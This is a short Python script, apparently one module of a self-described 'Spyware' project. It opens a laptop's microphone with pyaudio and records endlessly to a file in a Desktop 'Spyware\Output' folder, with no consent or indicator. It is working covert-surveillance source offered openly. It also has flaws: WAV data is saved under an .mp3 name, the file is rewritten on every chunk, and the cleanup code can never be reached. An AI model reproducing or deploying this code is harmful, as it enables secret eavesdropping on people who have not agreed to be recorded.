#!/usr/bin/env python
import pyaudio
import wave
import winshell

"""
This script accesses the Laptop's microphone using the library pyaudio and opens a stream to record the voice
and writes it to an mp3 file
"""
def start():
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        dest_path = winshell.desktop() + r"\Spyware\Output"
        dest_path = dest_path.replace('\\','/') + "/outputaudio.mp3"
        WAVE_OUTPUT_FILENAME = dest_path

        p = pyaudio.PyAudio()

        # open stream
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        # start streaming and writing to mp3 file
        while True:
            data = stream.read(CHUNK)
            frames.append(data)
            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

        stream.stop_stream()
        stream.close()
        p.terminate()

    except Exception:
        print("Failed")